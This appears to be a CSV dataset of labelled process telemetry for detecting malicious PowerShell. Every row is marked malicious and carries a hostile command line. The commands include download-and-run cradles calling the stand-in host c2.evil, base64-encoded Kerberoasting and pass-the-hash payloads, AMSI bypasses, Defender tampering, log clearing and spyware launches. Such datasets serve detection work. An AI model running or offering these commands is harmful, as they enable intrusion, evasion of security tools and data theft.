guid,pid,command_line,parent_count,child_process_count,network_connections,dns_queries,files_created,has_invoke,has_download,has_encoded,entropy,first_seen,label
{e7a05f0e-a394-6908-3baf-e0e4-5af8544603f1},8682,powershell -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAC0AYwAgACIASQBuAHYAbwBrAGUALQBTAE0AQgBFAHgAZQBjACAALQBUAGEAcgBnAGUAdAAgADEAOQAyAC4AMQA2ADgALgAxADAALgA1ADAAIAAtAFUAcwBlAHIAbgBhAG0AZQAgAGEAZABtAGkAbgAgAC0ASABhAHMAaAAgAGEAYQBkADMAYgA0ADMANQBiADUAMQA0ADAANABlAGUAYQBhAGQAMwBiADQAMwA1AGIANQAxADQAMAA0AGUAZQA6ADMAMQBkADYAYwBmAGUAMABkADEANgBhAGUAOQAzADEAYgA3ADMAYwA1ADkAZAA3AGUAMABjADAAOAA5AGMAMAAiAA==,1,3,2,2,1,False,False,True,0.132,2025-11-06T08:34:25.209232+00:00Z,1
{b409a852-610e-6908-3df3-91ab-5639dacef960},8683,powershell -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYwAyAC4AZQB2AGkAbAAvAGsAZQByAGIAZQByAG8AYQBzAHQALgBwAHMAMQAnACkAOwBJAG4AdgBvAGsAZQAtAEsAZQByAGIAZQByAG8AYQBzAHQA,1,3,1,0,4,False,False,True,0.173,2025-11-06T08:34:26.209267+00:00Z,1
{4ea635cf-c831-6908-ce76-ba5c-98379fce4772},8684,powershell -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAC0AYwAgACIAJgAgAHsASQBtAHAAbwByAHQALQBNAG8AZAB1AGwAZQAgAC4AXABTAGgAYQByAHAASABvAHUAbgBkAC4AcABzADEAOwBJAG4AdgBvAGsAZQAtAEIAbABvAG8AZABIAG8AdQBuAGQAIAAtAEMAbwBsAGwAZQBjAHQAaQBvAG4ATQBlAHQAaABvAGQAIABBAGwAbAB9ACIA,1,6,2,3,4,False,False,True,0.184,2025-11-06T08:34:27.209299+00:00Z,1
{f77741eb-61fd-6908-4c8f-3a34-325e1858af42},8685,IEX (New-Object Net.WebClient).DownloadString('http://c2.evil/adrecon.ps1'),1,3,4,1,2,True,True,False,0.493,2025-11-06T08:34:28.209339+00:00Z,1
{4075d54f-592a-6908-c93f-f406-29d1d568d465},8686,"IEX ('powershell -c ""IEX (New-O'+'bject Net.WebClient).Down'+'loadString('http://c2.evi'+'l/powerview.ps1');Get-Net'+'DomainController""')",1,5,3,1,2,True,True,False,0.307,2025-11-06T08:34:29.209378+00:00Z,1
{e6576587-ca4f-6908-f085-9ad2-ff98dd7b346e},8687,powershell -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYwAyAC4AZQB2AGkAbAAvAHMAaABhAHIAcABoAG8AdQBuAGQALgBwAHMAMQAnACkA,1,6,1,1,2,False,False,True,0.196,2025-11-06T08:34:30.209412+00:00Z,1
{2337bbb8-8d92-6908-5d9e-dd51-942458aabc34},8688,$upwzdu='Start-Process 'C:\temp\cobaltstrike.exe' -WindowStyle Hidden';IEX $upwzdu,1,2,2,2,2,True,False,False,0.451,2025-11-06T08:34:31.209444+00:00Z,1
{d58e152d-da5b-6908-0aed-f4ca-8c630a2bd986},8689,powershell -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYwAyAC4AZQB2AGkAbAAvAGIAZQBhAGMAbwBuAC4AcABzADEAJwApAA==,1,6,1,3,2,False,False,True,0.22,2025-11-06T08:34:32.209478+00:00Z,1
{a7cb01da-fdc1-6908-f57f-bffa-9856e702cea2},8690,powershell -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAC0AbgBvAHAAIAAtAHcAIABoAGkAZABkAGUAbgAgAC0AYwAgACIASQBFAFgAKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYwAyAC4AZQB2AGkAbAAvAHMAdABhAGcAZQAwAC4AcABzADEAJwApACkAIgA=,1,2,5,3,4,False,False,True,0.164,2025-11-06T08:34:33.209515+00:00Z,1
{bf8d7ae3-5365-6908-bdd7-aa66-339e562e7e52},8691,powershell -EncodedCommand cgBlAGcAIABhAGQAZAAgAEgASwBDAFUAXABTAG8AZgB0AHcAYQByAGUAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABDAHUAcgByAGUAbgB0AFYAZQByAHMAaQBvAG4AXABJAG4AdABlAHIAbgBlAHQAIABTAGUAdAB0AGkAbgBnAHMAIAAvAHYAIABQAHIAbwB4AHkARQBuAGEAYgBsAGUAIAAvAHQAIABSAEUARwBfAEQAVwBPAFIARAAgAC8AZAAgADEAIAAvAGYA,1,5,1,0,1,False,False,True,0.152,2025-11-06T08:34:34.209563+00:00Z,1
{07cad14e-2138-6908-fb83-7986-48052471dee4},8692,$zulkjp='reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings /v ProxyServer /t REG_SZ /d 127.0.0.1:8080 /f';IEX $zulkjp,1,2,2,1,1,True,False,False,0.371,2025-11-06T08:34:35.209591+00:00Z,1
{c007a6c6-b4e4-6908-9d4a-e2e0-3d71d233d02a},8693,IEX ('netsh winhttp set proxy 1'+'27.0.0.1:8080'),1,5,1,0,3,True,False,False,0.551,2025-11-06T08:34:36.209622+00:00Z,1
{80fd884c-52ee-6908-7b41-1b90-dd2dd100544b},8694,"powershell -c ""IEX (New-Object Net.WebClient).DownloadString('http://c2.evil/proxy.ps1');Set-Proxy""",1,6,5,0,2,True,True,False,0.424,2025-11-06T08:34:37.209656+00:00Z,1
{40b946c8-2cab-6908-e53e-1751-20176c333aea},8695,powershell -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYwAyAC4AZQB2AGkAbAAvAHMAYwByAGUAZQBuAHMAaABvAHQALgBwAHMAMQAnACkAOwBUAGEAawBlAC0AUwBjAHIAZQBlAG4AcwBoAG8AdAA=,1,2,3,3,1,False,False,True,0.168,2025-11-06T08:34:38.209691+00:00Z,1
{4e8995c9-4269-6908-357d-1636-b8f2694ec9d5},8696,"IEX ('powershell -c ""Add-Type -'+'AssemblyName System.Windo'+'ws.Forms; [System.Windows'+'.Forms.SendKeys]::SendWai'+'t('{CAPSLOCK}')""')",1,3,2,0,2,True,False,False,0.331,2025-11-06T08:34:39.209766+00:00Z,1
{ae5361ac-76cb-6908-b6f5-d8b5-42cd76d946e6},8697,powershell -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYwAyAC4AZQB2AGkAbAAvAGsAZQB5AGwAbwBnAGcAZQByAC4AcABzADEAJwApADsAUwB0AGEAcgB0AC0ASwBlAHkAbABvAGcAZwBlAHIA,1,4,5,3,4,False,False,True,0.182,2025-11-06T08:34:40.209800+00:00Z,1
{398e1c11-8cc1-6908-b8f5-3bdb-817d9640f569},8698,$opqubn='Start-Process 'C:\temp\mic.exe' -ArgumentList '/record' -WindowStyle Hidden';IEX $opqubn,1,5,1,0,4,True,False,False,0.412,2025-11-06T08:34:41.209851+00:00Z,1
{919826ea-a68c-6908-7a12-c858-47c9b86519d5},8699,$ujmiif='IEX (New-Object Net.WebClient).DownloadString('http://c2.evil/webcam.ps1');Start-Webcam';IEX $ujmiif,1,1,5,1,4,True,True,False,0.394,2025-11-06T08:34:42.209884+00:00Z,1
{bd275765-263f-6908-b5d1-64f9-8ee6a81f79c0},8700,"powershell -c ""IEX (New-Object Net.WebClient).DownloadString('http://c2.evil/clipboard.ps1');Watch-Clipboard""",1,3,2,2,3,True,True,False,0.358,2025-11-06T08:34:43.209926+00:00Z,1
{e0712f7a-4556-6908-3632-1004-13d0bd8226a6},8701,$lsnnzp='IEX (New-Object Net.WebClient).DownloadString('http://c2.evil/uac.ps1');Bypass-UAC';IEX $lsnnzp,1,4,1,1,3,True,True,False,0.442,2025-11-06T08:34:44.209958+00:00Z,1
{f18ed53e-3086-6908-0bc4-9f0a-dae48d4cb611},8702,powershell -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAC0AYwAgACIAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAHAAbwB3AGUAcgBzAGgAZQBsAGwAIAAtAFYAZQByAGIAIAByAHUAbgBBAHMAIAAtAEEAcgBnAHUAbQBlAG4AdABMAGkAcwB0ACAAJwAtAGMAIABJAEUAWAAoACgAZwBjACAAQwA6AFwAdABlAG0AcABcAGUAbABlAHYALgBwAHMAMQApAHwASQBFAFgAKQAnACIA,1,3,2,3,2,False,False,True,0.154,2025-11-06T08:34:45.209992+00:00Z,1
{28332130-ed2e-6908-1811-920e-9667a8dc6db2},8703,$cadmug='IEX (New-Object Net.WebClient).DownloadString('http://c2.evil/token.ps1');Steal-Token';IEX $cadmug,1,6,3,0,2,True,True,False,0.411,2025-11-06T08:34:46.210029+00:00Z,1
{292d1002-ef29-6908-0b6f-90a5-35e71f07bf99},8704,"$ptyogv='powershell -c ""& {Get-Process lsass | Stop-Process -Force}""';IEX $ptyogv",1,3,2,1,1,True,False,False,0.395,2025-11-06T08:34:47.210063+00:00Z,1
{76b61e94-294e-6908-f302-1d1d-7dd00585dedf},8705,powershell -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYwAyAC4AZQB2AGkAbAAvAHAAZQByAHMAaQBzAHQAZQBuAGMAZQAuAHAAcwAxACcAKQA7AEEAZABkAC0AUABlAHIAcwBpAHMAdABlAG4AYwBlAA==,1,1,4,3,3,False,False,True,0.177,2025-11-06T08:34:48.210092+00:00Z,1
{56289b9e-37eb-6908-2207-3a22-0e372333c422},8706,powershell -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAC0AYwAgACIASQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYwAyAC4AZQB2AGkAbAAvAGMAbABlAGEAbgB1AHAALgBwAHMAMQAnACkAOwBSAGUAbQBvAHYAZQAtAFQAcgBhAGMAZQBzACIA,1,1,5,1,1,False,False,True,0.16,2025-11-06T08:34:49.210138+00:00Z,1
{f23c3d37-bb27-6908-667c-87f1-45adab765b40},8707,wevtutil cl System,1,6,3,1,4,False,False,False,0.722,2025-11-06T08:34:50.210175+00:00Z,1
{f8a248a9-cd8e-6908-4127-bccc-8a171b416186},8708,wevtutil cl Application,1,1,5,0,3,False,False,False,0.609,2025-11-06T08:34:51.210212+00:00Z,1
{2e4b24e1-f25c-6908-fc14-fa31-81977b801e1b},8709,$lfguhd='Remove-Item C:\temp\* -Recurse -Force';IEX $lfguhd,1,1,4,2,1,True,False,False,0.508,2025-11-06T08:34:52.210249+00:00Z,1
{751d0be7-bae2-6908-6a70-fe61-c27acdf13dcf},8710,powershell -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAC0AYwAgACIARwBlAHQALQBIAGkAcwB0AG8AcgB5ACAAfAAgAEMAbABlAGEAcgAtAEgAaQBzAHQAbwByAHkAIgA=,1,3,2,2,3,False,False,True,0.28,2025-11-06T08:34:53.210288+00:00Z,1
{d0734cc9-485d-6908-8178-effd-e17607f4fe4b},8711,Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue,1,1,2,0,4,False,False,False,0.4,2025-11-06T08:34:54.210322+00:00Z,1
{f015b096-eb7b-6908-b708-4f82-dad13e27fde7},8712,$pgqnny='IEX (New-Object Net.WebClient).DownloadString('http://c2.evil/final.ps1')';IEX $pgqnny,1,4,5,2,3,True,True,False,0.453,2025-11-06T08:34:55.210368+00:00Z,1
{e6f8df7d-52a3-6908-6d32-6ad6-f39b211c8a9e},8713,$dsnddr='Start-Sleep -Seconds 3600';IEX $dsnddr,1,6,3,0,3,True,False,False,0.511,2025-11-06T08:34:56.210412+00:00Z,1
{9a64d450-1362-6908-f422-957a-56e35b440dac},8714,$yzjysu='IEX (New-Object Net.WebClient).DownloadString('http://c2.evil/1.ps1')';IEX $yzjysu,1,6,2,1,3,True,True,False,0.473,2025-11-06T08:34:57.210447+00:00Z,1
{f6a0b961-d622-6908-5fcc-28dd-3d48583f1568},8715,"IEX ('(New-Object Net.WebClient'+').DownloadFile('http://c2'+'.evil/payload.exe','C:\te'+'mp\x.exe');Start-Process '+'C:\temp\x.exe')",1,2,2,0,3,True,True,False,0.331,2025-11-06T08:34:58.210483+00:00Z,1
{d4d11c55-6ee3-6908-fe51-22f6-f3eb5b41db5f},8716,"IEX ('powershell -c ""IWR http:/'+'/c2.evil/m -OutFile $env:'+'TEMP\m.ps1;IEX $env:TEMP\'+'m.ps1""')",1,1,5,3,2,True,True,False,0.408,2025-11-06T08:34:59.210516+00:00Z,1
{f24e0ff8-2bd8-6908-9f68-ae05-e861b0b964ac},8717,powershell -EncodedCommand UwB0AGEAcgB0AC0AQgBpAHQAcwBUAHIAYQBuAHMAZgBlAHIAIAAtAFMAbwB1AHIAYwBlACAAaAB0AHQAcAA6AC8ALwBjADIALgBlAHYAaQBsAC8AYgAgAC0ARABlAHMAdABpAG4AYQB0AGkAbwBuACAAJABlAG4AdgA6AFQARQBNAFAAXABiAC4AZQB4AGUAOwBTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAAJABlAG4AdgA6AFQARQBNAFAAXABiAC4AZQB4AGUA,1,2,5,0,4,False,False,True,0.167,2025-11-06T08:35:00.210559+00:00Z,1
{58e01b4f-7d99-6908-a58e-d3b9-135ac5bdb176},8718,certutil -urlcache -split -f http://c2.evil/c C:\temp\c.exe;Start-Process C:\temp\c.exe,1,5,4,2,4,False,False,False,0.31,2025-11-06T08:35:01.210603+00:00Z,1
{0626176b-e32c-6908-d8ad-fcbc-b2f8a64de2ac},8719,$ymaytd='IEX (IWR http://c2.evil/2 -UseBasicParsing)';IEX $ymaytd,1,3,3,2,1,True,True,False,0.554,2025-11-06T08:35:02.210647+00:00Z,1
{2263ad62-9def-6908-73b1-8a70-4adf66bfed6f},8720,$deliod='(New-Object Net.WebClient).DownloadString('http://c2.evil/3.ps1') | IEX';IEX $deliod,1,1,5,1,3,True,True,False,0.452,2025-11-06T08:35:03.210680+00:00Z,1
{508dea87-8a9d-6908-2697-2c0d-ca630dfa5b4d},8721,"$rsotws='powershell -nop -w hidden -ep bypass -c ""IEX (New-Object Net.WebClient).DownloadString('http://c2.evil/4.ps1')""';IEX $rsotws",1,4,5,2,2,True,True,False,0.323,2025-11-06T08:35:04.210722+00:00Z,1
{03bc2ae1-e17b-6908-0167-95e0-f7060a0e17a0},8722,$ndxzzl='Invoke-WebRequest http://c2.evil/5.ps1 -OutFile $env:TEMP\5.ps1;powershell -File $env:TEMP\5.ps1';IEX $ndxzzl,1,6,5,1,4,True,False,False,0.364,2025-11-06T08:35:05.210763+00:00Z,1
{f6c225d2-fe1d-6908-3c51-482e-c75e5d3c9898},8723,Start-BitsTransfer http://c2.evil/6.ps1 $env:TEMP\6.ps1;IEX (gc $env:TEMP\6.ps1),1,4,1,0,3,True,False,False,0.438,2025-11-06T08:35:06.210804+00:00Z,1
{3befd844-9c20-6908-5cfe-ae4b-c6d7c68d4554},8724,powershell -EncodedCommand YwBlAHIAdAB1AHQAaQBsACAALQBkAGUAYwBvAGQAZQAgAGgAdAB0AHAAOgAvAC8AYwAyAC4AZQB2AGkAbAAvADcALgBiADYANAAgAEMAOgBcAHQAZQBtAHAAXAA3AC4AZQB4AGUAOwBTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAAQwA6AFwAdABlAG0AcABcADcALgBlAHgAZQA=,1,6,5,1,4,False,False,True,0.213,2025-11-06T08:35:07.210834+00:00Z,1
{dbeefce0-e1e3-6908-0e23-ff25-1646cd1fe8a6},8725,$rdnlyg='IEX ((New-Object Net.WebClient).DownloadString('http://c2.evil/8'))';IEX $rdnlyg,1,2,1,2,2,True,True,False,0.449,2025-11-06T08:35:08.210879+00:00Z,1
{f33724bd-64d9-6908-c668-e017-c35ee739b0b2},8726,powershell -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAC0AYwAgACIAJgAgAHsASQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYwAyAC4AZQB2AGkAbAAvADkALgBwAHMAMQAnACkAfQAiAA==,1,6,4,2,1,False,False,True,0.187,2025-11-06T08:35:09.210910+00:00Z,1
{402d631b-f0b4-6908-58a3-d626-5813926b8a67},8727,$mbenwq='Invoke-RestMethod http://c2.evil/10 | IEX';IEX $mbenwq,1,4,5,0,1,True,False,False,0.556,2025-11-06T08:35:10.210950+00:00Z,1
{c7d32fbc-d6fe-6908-e821-f748-ba0c1231b8b8},8728,IWR http://c2.evil/11 -Method POST -Body 'data=1' | IEX,1,5,3,2,4,True,True,False,0.6,2025-11-06T08:35:11.210984+00:00Z,1
{d1010137-ddb5-6908-c50d-cd3e-80dfdc7ff95c},8729,$murlvy='(New-Object System.Net.WebClient).DownloadString('http://c2.evil/12.ps1') > $env:TEMP\12.ps1;IEX $env:TEMP\12.ps1';IEX $murlvy,1,3,5,3,3,True,True,False,0.356,2025-11-06T08:35:12.211023+00:00Z,1
{8dd3a2b5-14c8-6908-d40c-5720-ef5089450af0},8730,$zmhhel='Start-BitsTransfer -Source http://c2.evil/13.exe -Destination C:\temp\13.exe;.& C:\temp\13.exe';IEX $zmhhel,1,2,3,3,4,True,False,False,0.345,2025-11-06T08:35:13.211067+00:00Z,1
{3d33639e-0a25-6908-2870-378c-395debf9c85b},8731,certutil -urlcache -f http://c2.evil/14.exe C:\temp\14.exe;Start-Process C:\temp\14.exe,1,3,3,3,3,False,False,False,0.333,2025-11-06T08:35:14.211106+00:00Z,1
{8bd43a8d-e99d-6908-2d90-7baa-b2bc540381a1},8732,$glyfbl='IEX (New-Object Net.WebClient).DownloadString('http://c2.evil/15.ps1')';IEX $glyfbl,1,1,5,3,3,True,True,False,0.467,2025-11-06T08:35:15.211144+00:00Z,1
{bc26e10d-4200-6908-8708-d961-d78078747404},8733,powershell -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAC0AZQBwACAAYgB5AHAAYQBzAHMAIAAtAGMAIAAiAEkARQBYACAAKABJAFcAUgAgAGgAdAB0AHAAOgAvAC8AYwAyAC4AZQB2AGkAbAAvADEANgAuAHAAcwAxACkAIgA=,1,4,5,3,2,False,False,True,0.273,2025-11-06T08:35:16.211187+00:00Z,1
{9ec232e5-4121-6908-049f-6030-e88ca9108c01},8734,"IEX ('[Ref].Assembly.GetType('S'+'ystem.Management.Automati'+'on.AmsiUtils').GetField(''+'amsiInitFailed','NonPubli'+'c,Static').SetValue($null'+',$true)')",1,3,5,0,3,True,False,False,0.271,2025-11-06T08:35:17.211231+00:00Z,1
{562a37f9-d0e9-6908-6f23-78bd-6c9d9a042261},8735,powershell -EncodedCommand JABhAD0AWwBSAGUAZgBdAC4AQQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQAVAB5AHAAZQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzACcAKQA7ACQAYQAuAEcAZQB0AEYAaQBlAGwAZAAoACcAYQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcALAAnAE4AbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkA,1,2,4,1,3,False,False,True,0.129,2025-11-06T08:35:18.211271+00:00Z,1
{48a84b3a-8c1c-6908-51ba-1f61-61164c2aa66f},8736,"sET-ItEM ( 'V'+'aR' +  'IA' + 'blE:1q2'  + 'uZx' )  ( [TYpE](  \""{1}{0}\""-F'F','rE'  ) )  ;  (    GeT-VariaBle  ( \""1Q2U\""  +'zX'  )  ).\""A`ss`Embly\"".\""GET`TY`Pe\""((  \""{6}{3}{1}{4}{2}{0}{5}\"" -f'Util','A','Amsi','.Management.','utomation.','s','System'  ) ).\""g`etf`iElD""(  ( \""{0}{2}{1}\"" -f'amsi','d','InitFaile'  ),(  \""{2}{4}{0}{1}{3}\"" -f 'Stat','i','NonPubli','c','c,'  )  ).\""sE`T`VaLUE\""(  ${n`ULl},${t`RuE} )",1,5,2,1,1,False,False,False,0.158,2025-11-06T08:35:19.211312+00:00Z,1
{45139034-9ac4-6908-6788-2c0d-06289ea6ffda},8737,powershell -EncodedCommand WwBSAHUAbgB0AGkAbQBlAC4ASQBuAHQAZQByAG8AcABTAGUAcgB2AGkAYwBlAHMALgBNAGEAcgBzAGgAYQBsAF0AOgA6AFcAcgBpAHQAZQBJAG4AdAAzADIAKABbAFIAdQBuAHQAaQBtAGUALgBJAG4AdABlAHIAbwBwAFMAZQByAHYAaQBjAGUAcwAuAE0AYQByAHMAaABhAGwAXQA6ADoAQQBsAGwAbwBjAEgARwBsAG8AYgBhAGwAKAA0ACkALAAwAHgANAAxADQAMQA0ADEANAAxACkA,1,4,2,1,4,False,False,True,0.168,2025-11-06T08:35:20.211346+00:00Z,1
{18ea3bcd-c77e-6908-d004-db21-adde1b129d36},8738,$lmfioc='Disable-WindowsOptionalFeature -Online -FeatureName Microsoft-Windows-Subsystem-Linux';IEX $lmfioc,1,2,3,0,1,True,False,False,0.336,2025-11-06T08:35:21.211388+00:00Z,1
{e4426d8d-e496-6908-f241-60bd-23c690a1fe4b},8739,$mwopxn='Set-MpPreference -DisableRealtimeMonitoring $true';IEX $mwopxn,1,4,5,0,2,True,False,False,0.451,2025-11-06T08:35:22.211420+00:00Z,1
{cd529255-2b26-6908-2ddc-d7c4-11332d61ea88},8740,Add-MpPreference -ExclusionPath 'C:\temp',1,4,4,2,2,False,False,False,0.659,2025-11-06T08:35:23.211458+00:00Z,1
{0e6e8d63-4ced-6908-548e-e203-7a5b800ecda4},8741,powershell -EncodedCommand UwBlAHQALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AUABhAHQAaAAgACcASABLAEwATQA6AFwAUwBPAEYAVABXAEEAUgBFAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzACAARABlAGYAZQBuAGQAZQByACcAIAAtAE4AYQBtAGUAIABEAGkAcwBhAGIAbABlAEEAbgB0AGkAUwBwAHkAdwBhAHIAZQAgAC0AVgBhAGwAdQBlACAAMQA=,1,5,1,1,2,False,False,True,0.157,2025-11-06T08:35:24.211509+00:00Z,1
{6c4970c3-47f1-6908-af28-d927-913f54a91f62},8742,powershell -EncodedCommand UwB0AG8AcAAtAFMAZQByAHYAaQBjAGUAIAAtAE4AYQBtAGUAIABXAGkAbgBEAGUAZgBlAG4AZAAgAC0ARgBvAHIAYwBlAA==,1,3,4,0,2,False,False,True,0.333,2025-11-06T08:35:25.211551+00:00Z,1
{558d220f-d256-6908-66c1-aa71-ee5b1eff963e},8743,$zrwnyu='Set-Service -Name WinDefend -StartupType Disabled';IEX $zrwnyu,1,5,1,3,4,True,False,False,0.465,2025-11-06T08:35:26.211598+00:00Z,1
{be73dcf7-4e90-6908-5d5b-ca52-8b49bc9c87a7},8744,$byxxff='reg add HKLM\SOFTWARE\Policies\Microsoft\Windows Defender /v DisableAntiSpyware /t REG_DWORD /d 1 /f';IEX $byxxff,1,1,2,1,3,True,False,False,0.369,2025-11-06T08:35:27.211636+00:00Z,1
{2165f10a-f827-6908-cb01-d390-8bc80b89f5c6},8745,"IEX ('powershell -c ""Set-MpPref'+'erence -DisableIntrusionP'+'reventionSystem $true""')",1,5,2,3,1,True,False,False,0.395,2025-11-06T08:35:28.211671+00:00Z,1
{c7773dac-b931-6908-4c15-9f6f-6160abd2029b},8746,powershell -EncodedCommand bgBlAHQAIABzAHQAbwBwACAAVwBpAG4ARABlAGYAZQBuAGQA,1,5,5,3,2,False,False,True,0.427,2025-11-06T08:35:29.211705+00:00Z,1
{fa1c0356-4fc8-6908-9f14-9b5d-dca466348012},8747,$fzhmlq='sc config WinDefend start= disabled';IEX $fzhmlq,1,6,2,3,2,True,False,False,0.491,2025-11-06T08:35:30.211746+00:00Z,1
{6d5b408d-f415-6908-5e64-c106-6be22576b9bf},8748,IEX ('Remove-ItemProperty -Path'+' 'HKLM:\SOFTWARE\Microsof'+'t\Windows\CurrentVersion\'+'Run' -Name 'SecurityHealt'+'h''),1,4,3,3,2,True,False,False,0.369,2025-11-06T08:35:31.211780+00:00Z,1
{6e303e1e-cba6-6908-35f1-1789-33445a7aea76},8749,powershell -EncodedCommand UwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0AUABVAEEAUAByAG8AdABlAGMAdABpAG8AbgAgADAA,1,1,3,2,3,False,False,True,0.313,2025-11-06T08:35:32.211817+00:00Z,1
{52f2478a-2c61-6908-7587-9971-181645e8177b},8750,Add-MpPreference -ExclusionExtension '.ps1',1,4,5,1,3,False,False,False,0.535,2025-11-06T08:35:33.211851+00:00Z,1
{009a912f-50c4-6908-51e4-0e3c-c56713a7c7c7},8751,Set-MpPreference -SubmitSamplesConsent 2,1,2,5,0,3,False,False,False,0.55,2025-11-06T08:35:34.211890+00:00Z,1
{2d6c4277-55ff-6908-f856-174b-7d222effd199},8752,IEX ('Set-MpPreference -MAPSRep'+'orting 0'),1,4,4,3,3,True,False,False,0.568,2025-11-06T08:35:35.211934+00:00Z,1
{c1fc972c-968a-6908-9e29-7a17-3a3b7b2029bd},8753,Set-MpPreference -HighThreatDefaultAction 6,1,1,4,0,4,False,False,False,0.558,2025-11-06T08:35:36.211973+00:00Z,1
